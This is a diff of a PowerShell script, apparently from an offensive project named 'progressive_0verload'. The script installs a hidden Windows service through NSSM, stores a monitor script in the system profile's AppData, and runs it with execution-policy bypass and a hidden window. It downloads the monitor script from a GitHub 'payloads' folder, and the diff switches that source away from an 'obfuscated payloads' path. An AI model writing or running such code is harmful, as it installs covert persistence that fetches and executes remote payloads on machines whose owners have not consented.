@@ -1,3 +1,7 @@
+param(
+    [string]$basePath
+)
+
 $paths = @(
     "$env:windir\system32\config\systemprofile\AppData\Local"
 )
@@ -9,7 +13,7 @@ $fwdmonPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
 $fwdmonPath = "$fwdmonPath\fwd_mon.ps1"
 $serviceName = "MyfwdmonService"
 $exepath = "powershell.exe"
-$arguments = "-ep bypass -nop -w hidden $fwdmonPath"
+$arguments = "-ep bypass -nop -w hidden $fwdmonPath -basePath $basePath"
 $downloadPath = "$env:temp\nssm.zip"
 
 if(-not(Test-Path -Path $nssmFolder -PathType Container)){
@@ -25,7 +29,7 @@ if(-not(Test-Path -Path $nssmexe)){
 }
 
 if(-not(Test-Path -Path $fwdmonPath -PathType Leaf)){
-    iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/obfuscated%20payloads/f.ps1" -OutFile $fwdmonPath
+    iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/fwd_mon.ps1" -OutFile $fwdmonPath
 }
 
 Remove-Item -Path $downloadPath -Force -Recurse
